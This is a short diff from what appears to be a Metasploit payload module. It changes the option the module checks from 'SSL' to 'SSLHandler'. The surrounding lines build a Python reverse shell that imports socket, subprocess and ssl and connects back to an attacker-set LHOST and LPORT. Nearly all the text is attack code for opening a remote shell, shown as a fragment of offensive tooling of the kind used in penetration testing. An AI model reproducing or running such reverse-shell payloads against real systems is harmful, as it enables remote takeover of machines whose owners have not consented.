@@ -55,7 +55,7 @@ module Metasploit3
 		cmd = ''
 		dead = Rex::Text.rand_text_alpha(2)
 		# Set up the socket
-		if datastore['SSL']
+		if datastore['SSLHandler']
 			cmd += "import socket,subprocess,os,ssl\n"
 			cmd += "so=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
 			cmd += "so.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
